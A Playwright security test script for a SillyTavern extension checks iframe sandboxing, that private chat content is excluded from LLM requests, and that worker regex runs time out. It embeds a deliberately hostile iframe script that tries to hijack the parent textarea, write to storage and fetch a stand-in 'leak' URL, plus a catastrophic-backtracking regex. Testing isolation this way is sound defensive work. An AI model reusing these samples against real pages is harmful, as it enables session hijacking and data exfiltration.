'use strict';
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { chromium } = require('playwright');
const { RUNTIME_FILES } = require('./install-ui.cjs');

async function main() {
    const origin = new URL(process.argv[2] || 'http://127.0.0.1:8001');
    if (!['http:', 'https:'].includes(origin.protocol) || !['localhost', '127.0.0.1', '[::1]'].includes(origin.hostname) || origin.username || origin.password) throw new Error('Loopback only');
    const source = path.resolve(__dirname, '../extension');
    const fixturePath = process.argv[3];
    // Only the embedded display rules are consumed, never the user's prompt text.
    const rules = fixturePath ? JSON.parse(fs.readFileSync(fixturePath, 'utf8')).extensions.regex_scripts : [{
        id: 'display', scriptName: 'fixture', findRegex: '(<SUOT>[\\s\\S]*?<\\/SUOT>)',
        replaceString: '```html\n<html><body><button id="option">Choose dusk</button><script>document.getElementById("option").onclick=()=>{window.parent.document.getElementById("send_textarea").value="Choose dusk";window.top.SillyTavern.getContext().generate()};</script></body></html>\n```',
        placement: [2], disabled: false, markdownOnly: true, promptOnly: false, trimStrings: [], substituteRegex: 0, minDepth: null, maxDepth: null,
    }];
    const browser = await chromium.launch({ headless: true, executablePath: process.env.CHROMIUM_EXECUTABLE_PATH || undefined });
    const network = [], errors = [];
    try {
        const context = await browser.newContext({ viewport: { width: 1100, height: 950 } });
        const page = await context.newPage(); page.setDefaultTimeout(12000);
        page.on('pageerror', error => errors.push(error.message));
        await context.route('**/*', route => {
            const url = new URL(route.request().url());
            if (url.origin === origin.origin && url.pathname === '/__cmi_preset_test__') return route.fulfill({ contentType: 'text/html', body: '<!doctype html><html><head><link rel="stylesheet" href="/fixture/style.css"></head><body><textarea id="send_textarea">MAIN CHAT SENTINEL</textarea><button id="send_but">Main send</button></body></html>' });
            if (url.origin === origin.origin && url.pathname.startsWith('/fixture/')) {
                const name = url.pathname.slice('/fixture/'.length);
                if (RUNTIME_FILES.includes(name)) return route.fulfill({ path: path.join(source, name), contentType: name.endsWith('.css') ? 'text/css' : 'application/javascript' });
            }
            network.push({ url: url.href, method: route.request().method() }); return route.abort();
        });
        await page.goto(`${origin.origin}/__cmi_preset_test__`);
        await page.evaluate(async rules => {
            const { normalizeLlmPreset } = await import('/fixture/llm-presets.js');
            const { snapshotScene } = await import('/fixture/scene-text.js');
            const { runPresetTask } = await import('/fixture/preset-worker-client.js');
            const { showPresetConversation } = await import('/fixture/preset-conversation.js');
            window.SillyTavern = { getContext: () => ({ extensionSettings: { secret: 'MAIN SECRET' } }) };
            window.__mainSend = 0; document.querySelector('#send_but').onclick = () => window.__mainSend++;
            window.__calls = []; window.__result = 'pending';
            const sourceChat = [{ is_user: true, mes: 'EXCLUDED USER' }, { role: 'user', mes: 'EXCLUDED ROLE USER' },
                { role: 'user', is_user: false, mes: 'EXCLUDED CONFLICTING USER' },
                { role: 'assistant', mes: 'old scene', name: 'Artist', extra: { reasoning: 'EXCLUDED REASONING' } }, { mes: 'EXCLUDED FUTURE' }];
            const sourceBefore = JSON.stringify(sourceChat);
            const preset = normalizeLlmPreset({ prompts: [{ identifier: 'main', role: 'system', content: '{{setvar::private::yes}}{{getvar::private}} {{lastMessage}}' }, { identifier: 'chatHistory', marker: true, role: 'user' }],
                prompt_order: [{ character_id: 100001, order: [{ identifier: 'main', enabled: true }, { identifier: 'chatHistory', enabled: true }] }], extensions: { regex_scripts: rules } }).preset;
            let state = await runPresetTask('create', { preset, snapshot: snapshotScene(sourceChat, 3, 10), fields: {}, char: 'Artist', user: 'User', bodyCleanupRules: '[]' });
            const draft = await runPresetTask('prepare', { state });
            window.__firstRequest = draft.messages;
            const initial = await runPresetTask('accept', { state: draft.state, content: 'old light\n<SUOT>\n1. Choose dusk\n2. Choose dawn\n</SUOT>' });
            state = initial.state;
            window.__conversation = showPresetConversation({ initial, cleanPrompt: value => value, onTurn: async (text, signal) => {
                const pending = await runPresetTask('prepare', { state, userText: text }, signal);
                window.__calls.push(pending.messages);
                const response = await runPresetTask('accept', { state: pending.state, content: 'landscape, dusk' }, signal);
                state = response.state; return response;
            } }).then(result => { window.__result = result; });
            window.__sourceUnchanged = sourceBefore === JSON.stringify(sourceChat);
        }, rules);
        await page.locator('.cmi-preset-conversation').waitFor();
        const firstRequest = await page.evaluate(() => window.__firstRequest);
        assert.doesNotMatch(JSON.stringify(firstRequest), /EXCLUDED/);
        assert.deepEqual(firstRequest.filter(message => message.role === 'assistant'), [{ role: 'assistant', content: 'old scene' }],
            'A user-role history container must retain assistant scene messages');
        assert.equal(await page.evaluate(() => window.__sourceUnchanged), true);
        assert.equal(await page.evaluate(() => window.__calls.length), 0);
        assert.equal(await page.locator('.cmi-preset-frame').getAttribute('sandbox'), '');
        await page.locator('.cmi-conversation-enable').click();
        const child = page.frameLocator('.cmi-preset-frame');
        const option = fixturePath ? child.locator('.option-btn').first() : child.locator('#option');
        await option.click();
        await page.waitForFunction(() => document.querySelector('.cmi-conversation-input').value === 'Choose dusk');
        assert.match(await page.locator('.cmi-conversation-status').textContent(), /尚未呼叫 API/);
        assert.equal(await page.evaluate(() => window.__calls.length), 0, 'Child direct-send is only a proposal');
        assert.equal(await page.locator('#send_textarea').inputValue(), 'MAIN CHAT SENTINEL');
        assert.equal(await page.evaluate(() => window.__mainSend), 0);
        if (fixturePath) {
            await child.locator('#directSendToggle').click();
            await child.locator('.option-btn').nth(1).click();
            await page.waitForFunction(() => document.querySelector('.cmi-conversation-input').value === 'Choose dawn');
            assert.match(await page.locator('.cmi-conversation-status').textContent(), /未送出/);
            assert.equal(await page.evaluate(() => window.__calls.length), 0);
            await child.locator('#directSendToggle').click(); await option.click();
            await page.waitForFunction(() => document.querySelector('.cmi-conversation-input').value === 'Choose dusk');
        }
        await page.locator('.cmi-conversation-send').evaluate(node => node.click());
        assert.equal(await page.evaluate(() => window.__calls.length), 0, 'Synthetic host click cannot submit');
        const output = path.resolve(__dirname, '../test-results'); fs.mkdirSync(output, { recursive: true });
        await page.locator('.cmi-preset-conversation').screenshot({ path: path.join(output, 'preset-conversation.png') });
        await page.locator('.cmi-conversation-send').click();
        await page.waitForFunction(() => document.querySelector('.cmi-conversation-prompt').value === 'landscape, dusk');
        const calls = await page.evaluate(() => window.__calls);
        assert.equal(calls.length, 1); assert.equal(calls[0].at(-1).role, 'user'); assert.match(calls[0].at(-1).content, /Choose dusk/);
        assert.doesNotMatch(JSON.stringify(calls), /<script>|DOCTYPE|MAIN SECRET|EXCLUDED/);
        await page.locator('.cmi-conversation-use').click();
        await page.waitForFunction(() => window.__result === 'landscape, dusk');
        assert.equal(await page.locator('.cmi-preset-frame').count(), 0);

        // A malicious script can propose actions, but cannot read the real parent,
        // send fetch traffic, or access origin storage. No automatic paid callback.
        await page.evaluate(async () => {
            const { mountPresetFrame } = await import('/fixture/preset-frame.js');
            window.__proposals = [];
            const html = `<html><body><script>
                let blockedParent=false,blockedStorage=false;
                try { window['parent'].document.getElementById('send_textarea').value='PWNED'; } catch { blockedParent=true; }
                try { localStorage.setItem('secret','leak'); } catch { blockedStorage=true; }
                fetch('https://not-allowed.invalid/leak').catch(()=>{});
                CMI.send(JSON.stringify({blockedParent,blockedStorage}));
            <\/script></body></html>`;
            window.__dispose = mountPresetFrame(document.body, html, { scripts: true, onAction: action => window.__proposals.push(action) });
        });
        await page.waitForFunction(() => window.__proposals.length === 1);
        const report = JSON.parse((await page.evaluate(() => window.__proposals))[0].text);
        assert.deepEqual(report, { blockedParent: true, blockedStorage: true });
        assert.equal(await page.locator('#send_textarea').inputValue(), 'MAIN CHAT SENTINEL');
        await page.evaluate(() => { window.__dispose(); window.dispatchEvent(new MessageEvent('message', { data: { type: 'send-request', text: 'spoof' }, source: window })); });
        assert.equal(await page.evaluate(() => window.__proposals.length), 1);
        const timeout = await page.evaluate(async () => {
            const { runPresetTask } = await import('/fixture/preset-worker-client.js');
            const { snapshotScene } = await import('/fixture/scene-text.js');
            try { await runPresetTask('clean', { snapshot: snapshotScene([{ mes: 'a'.repeat(28) + '!' }], 0, 0),
                bodyCleanupRules: JSON.stringify([{ findRegex: '/(a+)+$/', replaceString: '' }]) }, undefined, 100); return false; }
            catch (error) { return error.message.includes('逾時'); }
        });
        assert.equal(timeout, true, 'Pathological regex must be terminated off the UI thread');
        assert.deepEqual(network, []); assert.deepEqual(errors, []);
        console.log(JSON.stringify({ ok: true, originalWidget: Boolean(fixturePath), worker: 'real module workers and timeout',
            isolation: ['assistant mes only', 'no main DOM/storage', 'native widget shim', 'no automatic sends', 'trusted parent confirmation', 'no display HTML in LLM history'], network, errors }, null, 2));
    } finally { await browser.close(); }
}
main().catch(error => { console.error(error); process.exitCode = 1; });
